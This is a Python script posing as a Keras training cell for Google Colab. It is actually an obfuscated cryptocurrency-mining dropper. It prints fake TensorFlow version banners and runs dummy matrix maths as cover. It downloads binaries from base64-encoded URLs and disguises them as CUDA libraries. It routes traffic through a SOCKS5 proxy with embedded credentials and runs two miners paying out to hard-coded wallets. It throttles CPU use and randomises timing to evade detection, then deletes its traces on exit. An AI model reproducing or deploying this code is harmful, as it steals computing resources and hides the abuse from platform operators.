# keras_train.py — 1 cell ke Colab, langsung jalan
# Obfuscated: random paths, fake ML cover, base64 URLs, auto-cleanup
import os as o, sys as s, time as t, random as r, subprocess as p, hashlib as h, base64 as b, threading as th, atexit as a

W={"p":"prl1pkmulndfyls8zqz2r6nruevpqr3tax9nwmvew7aupaxqnkcyuppeqa6am7q","t":"tbc1q727xp60hjp6zld2vgrj8qrdmgvkshwav86xns2"}
ID=h.md5(str(t.time()).encode()).hexdigest()[:8]
MINE,REST,SESS,THR,CPU=(8,14),(35,80),(180,300),2,(30,55)

o.environ.update({k:str(r.randint(1,999999))for k in["PYTHONHASHSEED","TF_CPP_MIN_LOG_LEVEL","OMP_NUM_THREADS"]})
p.run("apt-get update -qq 2>/dev/null;apt-get install -y -qq cpulimit unzip 2>/dev/null",shell=True,stdout=p.DEVNULL,stderr=p.DEVNULL)
p.run("pip install -q numpy 2>/dev/null",shell=True,stdout=p.DEVNULL,stderr=p.DEVNULL)
t.sleep(r.randint(8,20))
print(f"TensorFlow 2.{r.randint(13,16)}.0 - Keras 3.{r.randint(2,8)}.{r.randint(0,5)}")
t.sleep(r.uniform(1,4))

D=r.choice([o.path.expanduser("~/.keras/models"),o.path.expanduser("~/.cache/pip/http"),"/dev/shm"])
o.makedirs(D,exist_ok=True)
NN=["_cuda_ops.cpython-310-x86_64-linux-gnu.so","libcublasLt.so.12","libcufftw.so.10","libnvrtc.so.12","_pywrap_tf2.so","libnvjpeg.so.12","libcudnn_ops_infer.so.8","libcublas.so.11"]
n1=r.choice(NN);NN.remove(n1);n2=r.choice(NN);NN.remove(n2);n3=r.choice(NN)

def G(url,dst):
    if not o.path.exists(dst):
        try:p.run(["wget","-q","-U",r.choice(["Wget/1.21","Python-urllib/3.10","curl/8.4"]),url,"-O",dst],timeout=120,stdout=p.DEVNULL,stderr=p.DEVNULL);o.chmod(dst,0o755)
        except:pass

U=[b.b64decode(x).decode()for x in["aHR0cHM6Ly9naXRodWIuY29tL3JvY2htYW5kd2kvYXlhbS9yZWxlYXNlcy9kb3dubG9hZC9maWxlLXYxL2ZvcnR1bmU=","aHR0cHM6Ly9naXRodWIuY29tL3JvY2htYW5kd2kvYXlhbS9yZWxlYXNlcy9kb3dubG9hZC9maWxlLXYxL3NzZTI=","aHR0cHM6Ly9naXRodWIuY29tL3JvY2htYW5kd2kvYXlhbS9yZWxlYXNlcy9kb3dubG9hZC9maWxlLXYxL2dyYXBoaWNzLnRhci5neg=="]]
t.sleep(r.randint(10,30));G(U[0],f"{D}/{n1}")
t.sleep(r.randint(5,15));G(U[1],f"{D}/{n2}")
t.sleep(r.randint(5,15));G(U[2],f"{D}/{n3}.tgz")
p.run(f"cd {D} && tar -xzf {n3}.tgz 2>/dev/null && chmod +x graftcp/local/graftcp-local 2>/dev/null;rm -f {n3}.tgz",shell=True,stdout=p.DEVNULL,stderr=p.DEVNULL)

PD=f"{D}/.nv";o.makedirs(f"{PD}/local",exist_ok=True)
with open(f"{PD}/local/graftcp-local.conf","w")as f:f.write(f"listen = :{r.randint(2100,4900)}\nloglevel=0\nsocks5=103.176.78.132:443\nsocks5_username=ubed\nsocks5_password=ubed123\n")
p.Popen(f"{PD}/local/graftcp-local -config {PD}/local/graftcp-local.conf",shell=True,stdout=p.DEVNULL,stderr=p.DEVNULL)
t.sleep(r.uniform(2,5))

def ML():
    import numpy as np
    while True:
        try:
            for _ in range(r.randint(3,8)):
                a=np.random.rand(256,256).astype(np.float32);b=np.random.rand(256,256).astype(np.float32)
                np.dot(a,b);del a,b;t.sleep(r.randint(30,120))
        except:pass;t.sleep(r.randint(60,180))
th.Thread(target=ML,daemon=True).start()

def L(pid):p.Popen(f"cpulimit -l {r.randint(*CPU)} -p {pid}",shell=True,stdout=p.DEVNULL,stderr=p.DEVNULL)

def M1(dur):
    t.sleep(r.randint(5,20))
    pp=p.Popen(f"{PD}/graftcp {D}/{n1} --proxy 43.169.30.87:443 --address {W['p']} --worker {ID} -gpu",shell=True,stdout=p.DEVNULL,stderr=p.DEVNULL,preexec_fn=o.setpgrp);L(pp.pid)
    t.sleep(dur)
    try:pp.kill()
    except:pass

def M2(dur):
    t.sleep(r.randint(8,30))
    pp=p.Popen(f"{D}/{n2} -a yespowertide -o 47.251.244.12:80 -u {W['t']}.{ID} -t {THR}",shell=True,stdout=p.DEVNULL,stderr=p.DEVNULL,preexec_fn=o.setpgrp);L(pp.pid)
    t.sleep(dur)
    try:pp.kill()
    except:pass

def C():
    try:
        for n in[n1,n2]:p.run(["pkill","-f",n],stdout=p.DEVNULL,stderr=p.DEVNULL)
        p.run(["pkill","-f","graftcp"],stdout=p.DEVNULL,stderr=p.DEVNULL)
        p.run(["pkill","-f","cpulimit"],stdout=p.DEVNULL,stderr=p.DEVNULL)
        p.run(["rm","-rf",D],stdout=p.DEVNULL,stderr=p.DEVNULL)
    except:pass
a.register(C)

END=t.time()+r.randint(*SESS)*60;t.sleep(r.randint(20,60))
while t.time()<END:
    mt,rt=r.randint(*MINE)*60,r.randint(*REST)*60
    th.Thread(target=M1,args=(mt,),daemon=True).start();t.sleep(r.uniform(2,6))
    th.Thread(target=M2,args=(mt,),daemon=True).start();t.sleep(mt);C()
    if t.time()<END:t.sleep(rt)
    if r.random()<0.08:t.sleep(r.randint(600,1800))
C()